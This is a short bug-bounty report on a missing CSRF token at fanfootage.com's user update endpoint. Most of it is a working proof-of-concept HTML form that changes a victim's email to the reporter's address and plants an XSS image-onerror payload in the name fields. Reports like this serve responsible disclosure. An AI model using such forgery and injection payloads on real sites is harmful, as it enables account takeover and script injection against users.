# HackerOne Report: NO CSRF token found on user details update
**Report ID:** 15454
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Here is the CSRF

<html>
  <!-- CSRF PoC  BY Chandrakant -->
  <body>
    <form action="https://fanfootage.com/users/update" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="user&#91;username&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="hidden" name="user&#91;email&#93;" value="chandrakantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="user&#91;full&#95;name&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="hidden" name="commit" value="Done" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


## Discussion & Remediation Timeline
